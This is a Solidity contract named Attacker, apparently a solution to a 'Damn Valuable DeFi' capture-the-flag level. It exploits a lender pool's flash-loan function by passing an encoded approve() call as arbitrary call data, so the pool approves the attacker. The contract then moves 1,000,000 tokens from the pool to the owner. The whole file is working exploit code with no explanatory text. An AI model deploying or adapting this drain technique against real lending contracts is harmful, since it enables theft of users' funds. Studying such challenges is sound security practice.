// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface ILenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract Attacker {
    IERC20 public immutable damnValuableToken;
    ILenderPool private lenderPoolAddres;
    address private owner;

    constructor(address _tokenAddress, address _lenderPoolAddress) {
        damnValuableToken = IERC20(_tokenAddress);
        lenderPoolAddres = ILenderPool(_lenderPoolAddress);
        owner = msg.sender;
    }

    function attack() external {
        lenderPoolAddres.flashLoan(
            0,
            address(this),
            address(damnValuableToken),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                1000000 * 1e18
            )
        );
        damnValuableToken.transferFrom(
            address(lenderPoolAddres),
            owner,
            1000000 * 1e18
        );
    }
}
